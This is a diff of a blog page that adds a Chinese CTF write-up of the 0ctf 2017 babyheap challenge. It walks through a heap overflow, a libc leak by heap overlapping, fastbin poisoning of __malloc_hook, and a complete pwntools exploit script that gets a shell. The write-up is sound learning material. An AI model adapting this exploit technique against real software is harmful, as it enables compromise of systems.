@@ -15,14 +15,20 @@
 
 
 
+<meta name="description" content="pwn真的是太有趣了，让人上头哈哈哈。这道题也是一道堆利用的基础题。记录一下自己的学习过程，也是总结一下这类题目的解题思路以及基本套路。">
+<meta name="keywords" content="pwn">
 <meta property="og:type" content="article">
 <meta property="og:title" content="0ctf-2017-babyheap">
 <meta property="og:url" content="http://yoursite.com/2020/03/20/0ctf-2017-babyheap/index.html">
 <meta property="og:site_name" content="good good study,day day up!">
+<meta property="og:description" content="pwn真的是太有趣了，让人上头哈哈哈。这道题也是一道堆利用的基础题。记录一下自己的学习过程，也是总结一下这类题目的解题思路以及基本套路。">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2020-03-20T12:50:58.695Z">
+<meta property="og:image" content="http://yoursite.com/img/0ctf-babyheap/1.jpg">
+<meta property="og:updated_time" content="2020-03-20T14:14:45.372Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="0ctf-2017-babyheap">
+<meta name="twitter:description" content="pwn真的是太有趣了，让人上头哈哈哈。这道题也是一道堆利用的基础题。记录一下自己的学习过程，也是总结一下这类题目的解题思路以及基本套路。">
+<meta name="twitter:image" content="http://yoursite.com/img/0ctf-babyheap/1.jpg">
 
 <link rel="apple-touch-icon" href="/apple-touch-icon.png">
 
@@ -283,6 +289,10 @@
         
 
         
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+    </div>
+
         <div class="clearfix"></div>
       </div>
       
@@ -290,7 +300,33 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        
+        <p>pwn真的是太有趣了，让人上头哈哈哈。这道题也是一道堆利用的基础题。记录一下自己的学习过程，也是总结一下这类题目的解题思路以及基本<br>套路。</p>
+<a id="more"></a>
+
+<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/aidmong/Desktop/ctf/pwn/buuctf/babyheap/babyheap&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+
+<p>分析发现程序的保护全开，实在是让人头痛。这样的话我们肯定是要泄露地址，同时由于不能修改got表，那我们可能还要修改malloc_hook</p>
+<p>ida反汇编后发现是一道比较常见的菜单题<br>创建没什么好说的，就是输入我们需要的chunk大小，利用calloc函数来创建，最后把chunk是否使用，chunk的大小和堆地址存储在一个全局<br>变量中。这里唯一需要注意的就是由于本题使用的是calloc函数，因此在申请地址的时候会把原地址的内容给清除，这会给我们的利用带来一定<br>的麻烦。<br><img src="/img/0ctf-babyheap/1.jpg" alt="avatar"><br>编辑函数就是我们本题的漏洞所在了，由于并没有对编辑的size进行检查，因此这里就有了一个堆溢出的漏洞<br>至于delete和show也没啥好多说的，就是不断构造chunk来泄露地址以及拿到需要的shell</p>
+<h2 id="具体利用"><a href="#具体利用" class="headerlink" title="具体利用"></a>具体利用</h2><p>我们首先利用堆溢出伪造一个size覆盖了下一个chunk的chunk</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">create(0x20)</span><br><span class="line">create(0x20)</span><br><span class="line">create(0x100)</span><br><span class="line">create(0x20)</span><br><span class="line">payload = &apos;a&apos;*0x20+p64(0)+p64(0x141)</span><br><span class="line">edit(0,len(payload),payload)</span><br></pre></td></tr></table></figure>
+
+<p>这时我们的堆结构已经被我们修改</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">x/40gx 0x562182141000</span><br><span class="line">0x562182141000:	0x0000000000000000	0x0000000000000031  ==&gt;chunk0</span><br><span class="line">0x562182141010:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x562182141020:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x562182141030:	0x0000000000000000	0x0000000000000141  ==&gt;chunk1</span><br><span class="line">0x562182141040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x562182141050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x562182141060:	0x0000000000000000	0x0000000000000111  ==&gt;chunk2</span><br><span class="line">0x562182141070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x562182141080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x562182141090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5621821410a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5621821410b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5621821410c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5621821410d0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>接下来我们先删除chunk1，由于chunk1的大小属于unsorted bin的范围，所以chunk1会被加入双向链表。这样其实我们保存<br>chunk地址的全局变量ptr中的chunk1信息已经被清空了。然后我们再次创建一个大小为0x130的chunk，并且再次伪造出原先的chunk2。这<br>样当我们show(1)时，我们就能够直接泄露到chunk2了。然后我们只需要释放chunk2，chunk2也会被加入链表，同时根据libc的机制，chunk2<br>的fd 和bk都会存储libc_main_arena的地址。之后我们就能利用show(1)来连带着泄露出libc地址。这就是做题时常常会使用到的heap<br>overlapping了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">delete(1)</span><br><span class="line">create(0x130)</span><br><span class="line">payload = &apos;\x00&apos;*0x20+p64(0)+p64(0x111)</span><br><span class="line">edit(1,len(payload),payload)</span><br><span class="line">delete(2)</span><br><span class="line">show(1)</span><br><span class="line">p.recv(0x3a)</span><br><span class="line">libc_main_arena = u64(p.recv(6).ljust(8,&apos;\x00&apos;))-88</span><br><span class="line">#obj = LibcSearcher(&apos;main_arena&apos;,libc_main_arena)</span><br><span class="line">libc_base = libc_main_arena - offset</span><br><span class="line">shell = libc_base + 0x4526a</span><br></pre></td></tr></table></figure>
+
+<p>接下里我们需要做的就是劫持malloc_hook了，我们都知道malloc_hook的地址是在libc_main_arena的上方。这里我们选择劫持比较常见<br>的main_arena-0x33这个地址，因为这里可以被作为一个合理的fakechunk，只要申请到这个地址，我们就能够对malloc_hook进行修改。<br>同样的我们就能够想到由于libc在申请chunk的时候首先会检查bin里面有没有合适大小的chunk，我们可以尝试修改fastbin这个链表，来申请<br>出我们所需要的chunk。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create(0x60)</span><br><span class="line">delete(2)</span><br><span class="line">payload = &apos;a&apos;*0x20+p64(0)+p64(0x71)+p64(fake_addr)</span><br><span class="line">edit(1,len(payload),payload)</span><br></pre></td></tr></table></figure>
+
+<p>在这样的修改之后，我们再去查看堆布局就会发现chunk2的fd就会变我们伪造的chunk地址，同时fastbin中也被加入了这个地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; fastbin</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x556579e09060 —▸ 0x7f557744daed (_IO_wide_data_0+301) ◂— 0x557710ee20000000</span><br><span class="line">0x80: 0x0</span><br></pre></td></tr></table></figure>
+
+<p>那么当我们申请两次之后，申请到的就是fake_addr，然后在里面填充one_gadgets就能拿到shell了</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">p = process(&apos;./babyheap&apos;)</span><br><span class="line">#p = remote(&apos;node3.buuoj.cn&apos;,26569)</span><br><span class="line">offset = 0x3c4b20</span><br><span class="line"></span><br><span class="line">def create(size):</span><br><span class="line">	p.sendlineafter(&apos;: &apos;,&apos;1&apos;)</span><br><span class="line">	p.recvuntil(&apos;Size: &apos;)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line"></span><br><span class="line">def edit(idx,size,content):</span><br><span class="line">	p.sendlineafter(&apos;: &apos;,&apos;2&apos;)</span><br><span class="line">	p.recvuntil(&apos;Index: &apos;)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(&apos;Size: &apos;)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(&apos;Content: &apos;)</span><br><span class="line">	p.send(content)</span><br><span class="line">	</span><br><span class="line">def delete(idx):</span><br><span class="line">	p.sendlineafter(&apos;: &apos;,&apos;3&apos;)</span><br><span class="line">	p.recvuntil(&apos;Index: &apos;)	</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">	p.sendlineafter(&apos;: &apos;,&apos;4&apos;)</span><br><span class="line">	p.recvuntil(&apos;Index: &apos;)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">create(0x20)</span><br><span class="line">create(0x20)</span><br><span class="line">create(0x100)</span><br><span class="line">create(0x20)</span><br><span class="line">payload = &apos;a&apos;*0x20+p64(0)+p64(0x141)</span><br><span class="line">edit(0,len(payload),payload)</span><br><span class="line">delete(1)</span><br><span class="line">create(0x130)</span><br><span class="line">payload = &apos;\x00&apos;*0x20+p64(0)+p64(0x111)</span><br><span class="line">edit(1,len(payload),payload)</span><br><span class="line">delete(2)</span><br><span class="line">show(1)</span><br><span class="line">p.recv(0x3a)</span><br><span class="line">libc_main_arena = u64(p.recv(6).ljust(8,&apos;\x00&apos;))-88</span><br><span class="line">#obj = LibcSearcher(&apos;main_arena&apos;,libc_main_arena)</span><br><span class="line">libc_base = libc_main_arena - offset</span><br><span class="line">shell = libc_base + 0x4526a</span><br><span class="line"></span><br><span class="line">#print hex(libc_base)</span><br><span class="line">create(0x60)</span><br><span class="line">delete(2)</span><br><span class="line">fake_addr = libc_main_arena-0x33</span><br><span class="line">payload = &apos;a&apos;*0x20+p64(0)+p64(0x71)+p64(fake_addr)</span><br><span class="line">print payload</span><br><span class="line">edit(1,len(payload),payload)</span><br><span class="line">create(0x60)</span><br><span class="line">create(0x60)</span><br><span class="line">payload = &apos;a&apos;*0x13+p64(shell)</span><br><span class="line">edit(4,len(payload),payload)</span><br><span class="line">create(0x10)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这种题目现在基本只能算作比赛的签到题了，本菜鸡还是不能完整的解出来。心态都要爆炸了。不说了，撸源码去了呜呜呜</p>
+
       
     </div>
     
@@ -301,7 +337,7 @@
         <p><span>本文标题:</span><a href="/2020/03/20/0ctf-2017-babyheap/">0ctf-2017-babyheap</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">HeZhaochen</a></p>
         <p><span>发布时间:</span>2020-03-20, 20:50:58</p>
-        <p><span>最后更新:</span>2020-03-20, 20:50:58</p>
+        <p><span>最后更新:</span>2020-03-20, 22:14:45</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2020/03/20/0ctf-2017-babyheap/" title="0ctf-2017-babyheap">http://yoursite.com/2020/03/20/0ctf-2017-babyheap/</a>
             <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2020/03/20/0ctf-2017-babyheap/　　作者: HeZhaochen" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
@@ -331,7 +367,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#程序分析"><span class="toc-number">1.</span> <span class="toc-text">程序分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#具体利用"><span class="toc-number">2.</span> <span class="toc-text">具体利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">3.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小结"><span class="toc-number">4.</span> <span class="toc-text">小结</span></a></li></ol>
         
     </div>
     <style>
